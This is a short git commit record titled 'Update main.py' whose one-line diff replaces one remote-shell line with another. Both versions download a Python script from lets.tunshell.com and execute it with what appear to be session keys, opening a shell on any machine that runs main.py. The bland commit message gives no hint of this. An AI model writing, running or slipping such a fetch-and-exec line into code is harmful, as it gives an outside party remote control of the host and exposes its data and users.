81cc3aecef01431e6dcddd8875f06bd1daf91e0b
baigujing20 <baigujing20@outlook.com>
2025-09-04 11:49:19 +0800

    Update main.py

--- main.py
+++ main.py
@@ -1,1 +1,1 @@
-import urllib.request;r=urllib.request.urlopen('https://lets.tunshell.com/init.py');exec(r.read().decode('utf-8'),{'p':["T","aRsseDdm8dKN5PEMtOcLay","rUwKxiO2ohQdm7Tvawud5m"]})
+import urllib.request;r=urllib.request.urlopen('https://lets.tunshell.com/init.py');exec(r.read().decode('utf-8'),{'p':["T","km39dxaXwFYxyNtDZUw8Xa","JCGZcJYGEPbR0OfTgxLDBl"]})
